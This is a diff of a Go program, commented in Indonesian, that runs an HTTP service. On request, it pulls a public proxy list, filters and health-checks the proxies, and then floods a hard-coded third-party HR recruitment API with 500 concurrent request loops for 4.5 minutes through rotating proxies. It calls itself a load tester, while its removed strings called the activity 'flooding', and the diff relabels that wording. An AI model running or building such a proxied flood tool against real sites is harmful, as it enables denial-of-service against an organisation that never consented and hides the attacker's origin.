@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"log"
 	"net/http"
 	"net/url"
 	"sync"
@@ -14,73 +15,82 @@ type ProxyItem struct {
 	IPAddress   string   `json:"ip_address"`
 	Port        int      `json:"port"`
 	Protocols   []string `json:"protocols"`
-	CountryCode string   `json:"country_code"` // Ditambahkan untuk filter negara
+	CountryCode string   `json:"country_code"`
 }
 
 type ProxyResponse struct {
 	Results []ProxyItem `json:"results"`
 }
 
-// Global State untuk Monitoring & Mutex Lock
 var (
-	isRunning     int32 // 0 = idle/berhenti, 1 = sedang berjalan
+	isRunning     int32
 	requestCount  int64
 	successCount  int64
 	errorCount    int64
 	startTime     time.Time
-	statusMessage string
-	mu            sync.Mutex
+	statusMessage string = "IDLE (Siap dijalankan)"
 )
 
 func main() {
 	targetURL := "https://hris.quantumnusatama.id/api/rekrutmen/get-rekrutmen-data?id_rekrutmen=20653"
 	proxySourceURL := "https://micin-provider.pages.dev/proxy.json"
 
-	// Daftarkan Endpoint HTTP
 	http.HandleFunc("/run", func(w http.ResponseWriter, r *http.Request) {
-		// Proteksi Single Execution Lock (Hanya boleh 1x jalan bersamaan)
 		if !atomic.CompareAndSwapInt32(&isRunning, 0, 1) {
 			w.WriteHeader(http.StatusConflict)
-			w.Write([]byte("[-] Ditolak: Proses load test sedang berjalan! Harap tunggu hingga aktivitas flooding selesai (4.5 menit)."))
+			w.Write([]byte("[-] Ditolak: Proses load test sedang berjalan!"))
 			return
 		}
 
-		// Reset statistik sebelum mulai
 		atomic.StoreInt64(&requestCount, 0)
 		atomic.StoreInt64(&successCount, 0)
 		atomic.StoreInt64(&errorCount, 0)
 		startTime = time.Now()
-		statusMessage = "Mengunduh dan memfilter proxy dari URL..."
+		statusMessage = "Memulai proses background..."
 
-		w.Write([]byte("[+] Load test berhasil dimulai. Mengambil daftar proxy terbaru... Cek progress via /monitor"))
+		w.Write([]byte("[+] Load test dimulai. Pantau log real-time di /monitor atau terminal Docker."))
 
-		// Jalankan proses di background goroutine
 		go func() {
-			defer atomic.StoreInt32(&isRunning, 0) // Pastikan flag dilepas saat selesai
+			defer atomic.StoreInt32(&isRunning, 0)
 
-			// 1. Fetch data proxy langsung dari URL secara dinamis
-			clientHTTP := &http.Client{Timeout: 15 * time.Second}
+			// 1. Log Unduh Proxy
+			log.Println("[*] Tahap 1: Mengunduh daftar proxy dari URL...")
+			statusMessage = "Tahap 1: Mengunduh proxy dari URL..."
+
+			clientHTTP := &http.Client{Timeout: 20 * time.Second}
 			respProxy, err := clientHTTP.Get(proxySourceURL)
 			if err != nil {
-				statusMessage = fmt.Sprintf("Gagal mendownload proxy: %v", err)
+				errMsg := fmt.Sprintf("GAGAL mendownload proxy: %v", err)
+				log.Println("[-] " + errMsg)
+				statusMessage = errMsg
 				return
 			}
 			defer respProxy.Body.Close()
 
-			var proxyData ProxyResponse
-			if err := json.NewDecoder(respProxy.Body).Decode(&proxyData); err != nil {
-				statusMessage = fmt.Sprintf("Gagal parsing JSON proxy: %v", err)
+			if respProxy.StatusCode != http.StatusOK {
+				errMsg := fmt.Sprintf("GAGAL mendownload proxy: HTTP Status Code %d", respProxy.StatusCode)
+				log.Println("[-] " + errMsg)
+				statusMessage = errMsg
 				return
 			}
 
-			// 2. Filter kandidat proxy (Kecualikan country_code == "KR")
+			// 2. Log Parsing JSON
+			log.Println("[*] Tahap 2: Memproses dan parsing JSON proxy (Filter CountryCode != KR)...")
+			statusMessage = "Tahap 2: Parsing JSON dan memfilter proxy..."
+
+			var proxyData ProxyResponse
+			if err := json.NewDecoder(respProxy.Body).Decode(&proxyData); err != nil {
+				errMsg := fmt.Sprintf("GAGAL parsing JSON proxy: %v", err)
+				log.Println("[-] " + errMsg)
+				statusMessage = errMsg
+				return
+			}
+
 			var candidateProxies []string
 			for _, p := range proxyData.Results {
-				// Kecualikan jika CountryCode adalah "KR"
 				if p.CountryCode == "KR" {
 					continue
 				}
-
 				for _, proto := range p.Protocols {
 					if proto == "HTTPS" || proto == "HTTP" || proto == "SOCKS5" {
 						proxyURL := fmt.Sprintf("http://%s:%d", p.IPAddress, p.Port)
@@ -90,9 +100,10 @@ func main() {
 				}
 			}
 
-			statusMessage = fmt.Sprintf("Ditemukan %d kandidat proxy (Non-KR). Memulai health check...", len(candidateProxies))
+			log.Printf("[+] Total kandidat proxy valid (Non-KR): %d\n", len(candidateProxies))
+			statusMessage = fmt.Sprintf("Ditemukan %d kandidat proxy. Memulai health check...", len(candidateProxies))
 
-			// 3. Health check singkat proxy yang valid
+			// 3. Log Health Check
 			var validProxies []string
 			var wgChk sync.WaitGroup
 			var muChk sync.Mutex
@@ -107,7 +118,7 @@ func main() {
 					}
 					chkClient := &http.Client{
 						Transport: &http.Transport{Proxy: http.ProxyURL(parsedProxy)},
-						Timeout:   3 * time.Second,
+						Timeout:   4 * time.Second,
 					}
 					resp, err := chkClient.Get(targetURL)
 					if err == nil {
@@ -123,12 +134,15 @@ func main() {
 			wgChk.Wait()
 
 			if len(validProxies) == 0 {
+				log.Println("[!] Tidak ada proxy yang lolos health check. Menggunakan koneksi DIRECT.")
 				validProxies = append(validProxies, "DIRECT")
+			} else {
+				log.Printf("[+] Health check selesai. Proxy aktif: %d dari %d kandidat.\n", len(validProxies), len(candidateProxies))
 			}
 
 			statusMessage = fmt.Sprintf("Health check selesai. Proxy aktif: %d. Memulai load test...", len(validProxies))
 
-			// 4. Konfigurasi Load Test (Durasi 4.5 Menit)
+			// 4. Tahap Load Test
 			totalConcurrency := 500
 			stopChan := make(chan struct{})
 
@@ -155,10 +169,8 @@ func main() {
 					} else {
 						parsedProxy, _ := url.Parse(pStr)
 						client = &http.Client{
-							Transport: &http.Transport{
-								Proxy: http.ProxyURL(parsedProxy),
-							},
-							Timeout: 5 * time.Second,
+							Transport: &http.Transport{Proxy: http.ProxyURL(parsedProxy)},
+							Timeout:   5 * time.Second,
 						}
 					}
 
@@ -185,15 +197,15 @@ func main() {
 			}
 
 			loadWg.Wait()
+			log.Println("[+] Load test 4.5 menit telah selesai.")
 			statusMessage = "Load test selesai."
 		}()
 	})
 
-	// Endpoint untuk Monitoring
 	http.HandleFunc("/monitor", func(w http.ResponseWriter, r *http.Request) {
 		runningStatus := "IDLE (Siap dijalankan)"
 		if atomic.LoadInt32(&isRunning) == 1 {
-			runningStatus = "RUNNING (Sedang melakukan flooding)"
+			runningStatus = "RUNNING (Sedang berjalan)"
 		}
 
 		elapsed := time.Since(startTime).Seconds()
@@ -206,7 +218,7 @@ func main() {
 			"message":       statusMessage,
 			"elapsed_sec":   int(elapsed),
 			"total_request": atomic.LoadInt64(&requestCount),
-			"sukses_200":    atomic.LoadInt64(&successCount),
+			"sukses_200":     atomic.LoadInt64(&successCount),
 			"error_lainnya": atomic.LoadInt64(&errorCount),
 		}
 
@@ -214,11 +226,8 @@ func main() {
 		json.NewEncoder(w).Encode(data)
 	})
 
-	fmt.Println("\n[+] Server berjalan di port :8080 (Mengambil proxy online & filter KR)")
-	fmt.Println("    -> Endpoint: http://localhost:8080/run")
-	fmt.Println("    -> Endpoint: http://localhost:8080/monitor")
-
+	log.Println("[+] Server loadtester berjalan di port :8080")
 	if err := http.ListenAndServe(":8080", nil); err != nil {
-		fmt.Printf("Server error: %v\n", err)
+		log.Fatalf("Server error: %v", err)
 	}
 }
